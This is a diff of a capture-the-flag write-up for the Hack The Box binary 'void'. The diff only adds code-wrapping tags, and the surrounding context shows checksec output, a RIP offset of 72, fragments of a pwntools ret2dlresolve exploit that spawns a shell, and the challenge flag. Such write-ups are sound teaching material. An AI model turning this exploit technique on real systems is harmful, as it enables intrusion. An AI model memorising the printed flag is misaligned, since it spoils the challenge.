@@ -26,11 +26,14 @@ layout:
 
 Check file properties and binary protections.
 
+{% code overflow="wrap" %}
 ```bash
 file void
 void: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=a5a29f47fbeeeff863522acff838636b57d1c213, for GNU/Linux 3.2.0, not stripped
 ```
+{% endcode %}
 
+{% code overflow="wrap" %}
 ```bash
 checksec --file void
 [*] '/home/crystal/Desktop/challenge/void'
@@ -41,11 +44,13 @@ checksec --file void
     PIE:      No PIE (0x400000)
     RUNPATH:  b'./glibc/'
 ```
+{% endcode %}
 
 PwnTools script finds offset of 72 for RIP.
 
 [ret2dlresolve](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve/exploitation) exploit works with little modification.
 
+{% code overflow="wrap" %}
 ```python
 from pwn import *
 
@@ -111,5 +116,6 @@ io.sendline(dlresolve.payload)                # now the read is called and we pa
 # Got Shell?
 io.interactive()
 ```
+{% endcode %}
 
 Flag: `HTB{r3s0lv3_th3_d4rkn355}`
